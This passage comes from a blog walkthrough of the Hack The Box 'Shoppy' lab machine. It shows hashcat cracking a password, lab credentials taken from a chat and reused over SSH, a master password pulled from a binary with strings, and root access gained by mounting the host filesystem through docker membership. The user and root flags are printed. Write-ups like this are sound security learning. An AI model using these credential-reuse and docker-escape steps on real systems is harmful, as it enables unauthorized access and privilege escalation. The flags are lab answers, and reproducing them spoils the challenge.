+</span></span><span style="display:flex;"><span>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 (100.00%)
+</span></span><span style="display:flex;"><span>Speed.#1.........:  4763.0 kH/s (0.10ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
+</span></span><span style="display:flex;"><span>Progress.........: 14344385/14344385 (100.00%)
+</span></span><span style="display:flex;"><span>Rejected.........: 0/14344385 (0.00%)
+</span></span><span style="display:flex;"><span>Restore.Point....: 14344385/14344385 (100.00%)
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]
+</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 41%
+</span></span></code></pre></div><p>Nice! Looks like the hash for Josh cracked and we got the password. Let&rsquo;s try to log into the host as him. Nope, maybe he isn&rsquo;t a user. Let&rsquo;s go back to the <code>mattermost.shoppy.htb</code> site, and we are able to log in as Josh there
+<img src="/images/Shoppy/josh.png" alt="Website"></p>
+<p>Looking through the chat channels, we find credentials for the &ldquo;deploy machine&rdquo;
+<img src="/images/Shoppy/deploy.png" alt="Website"></p>
+<p>The credentials are:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jaeger:Sh0ppyBest@pp!
+</span></span></code></pre></div><p>The chat also mentions using docker. Let&rsquo;s try to log in as <code>jaeger</code> through SSH. It works!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh jaeger@10.10.11.180
+</span></span><span style="display:flex;"><span>jaeger@10.10.11.180&#39;s password: 
+</span></span><span style="display:flex;"><span>Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>jaeger@shoppy:~$ 
+</span></span></code></pre></div><p>Let&rsquo;s grab the user flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:~$ cat user.txt
+</span></span><span style="display:flex;"><span>5a4c216082bd7899a9b7d8faa9ba1719
+</span></span></code></pre></div><p>We aren&rsquo;t in any special groups, but it looks like we have <code>sudo</code> permissions to run <code>password-manager</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries for jaeger on shoppy:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>User jaeger may run the following commands on shoppy:
+</span></span><span style="display:flex;"><span>    (deploy) /home/deploy/password-manager
+</span></span></code></pre></div><p>There is also a <code>shoppy_start.sh</code> script in the home directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:~$ cat shoppy_start.sh
+</span></span><span style="display:flex;"><span>#!/bin/bash
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>export NVM_DIR=&#34;$HOME/.nvm&#34;
+</span></span><span style="display:flex;"><span>[ -s &#34;$NVM_DIR/nvm.sh&#34; ] &amp;&amp; \. &#34;$NVM_DIR/nvm.sh&#34;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>cd /home/jaeger/ShoppyApp &amp;&amp; npm start
+</span></span></code></pre></div><p>Looking at the <code>home</code> directory, we see there is a <code>deploy</code> user, and in their directory are some interesting files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ ls
+</span></span><span style="display:flex;"><span>creds.txt  password-manager  password-manager.cpp
+</span></span></code></pre></div><p>Trying to <code>cat</code> the <code>creds.txt</code> file results in a permission denied. Let&rsquo;s try to run the <code>password-manager</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+</span></span><span style="display:flex;"><span>Welcome to Josh password manager!
+</span></span><span style="display:flex;"><span>Please enter your master password: Sh0ppyBest@pp!
+</span></span><span style="display:flex;"><span>Access denied! This incident will be reported !
+</span></span></code></pre></div><p>We also tried the password we found earlier <code>remembermethisway</code> without any success. So we need to find a master password on the system somewhere. Running <code>strings</code> on the <code>password-manager</code> file doesn&rsquo;t result in anything useful. However, if we use a different encoding with the <code>-e l</code> flag for 16-bit littleendian, then we see the password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$strings -e l password-manager
+</span></span><span style="display:flex;"><span>Sample
+</span></span></code></pre></div><p>Now we can use that as the master password for the <code>password-manager</code> app</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
+</span></span><span style="display:flex;"><span>Welcome to Josh password manager!
+</span></span><span style="display:flex;"><span>Please enter your master password: Sample
+</span></span><span style="display:flex;"><span>Access granted! Here is creds !
+</span></span><span style="display:flex;"><span>Deploy Creds :
+</span></span><span style="display:flex;"><span>username: deploy
+</span></span><span style="display:flex;"><span>password: Deploying@pp!
+</span></span></code></pre></div><p>Now we can <code>su</code> into the deploy user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jaeger@shoppy:/home/deploy$ su deploy
+</span></span></code></pre></div><p>Doing an <code>id</code> on the deploy user shows that we are a part of the docker group</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>deploy@shoppy:~$ id
+</span></span><span style="display:flex;"><span>uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+</span></span></code></pre></div><p>We can check what images exist</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>deploy@shoppy:~$ docker image ls
+</span></span><span style="display:flex;"><span>REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+</span></span><span style="display:flex;"><span>alpine       latest    d7d3d98c851f   2 years ago   5.53M
+</span></span></code></pre></div><p>Then we can mount the entire host file system on the <code>/mnt</code> directory on the container</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>deploy@shoppy:~$ docker run -v /:/mnt -it alpine
+</span></span><span style="display:flex;"><span>/ # 
+</span></span></code></pre></div><p>Then we can simply navigate to the root directory since we mounted the entire file system, and grab the flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>/ # cd /mnt/root
+</span></span><span style="display:flex;"><span>/mnt/root # ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>/mnt/root # cat root.txt
+</span></span><span style="display:flex;"><span>2a3b12ef75db3fe54fd41b2db5c0be6c
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
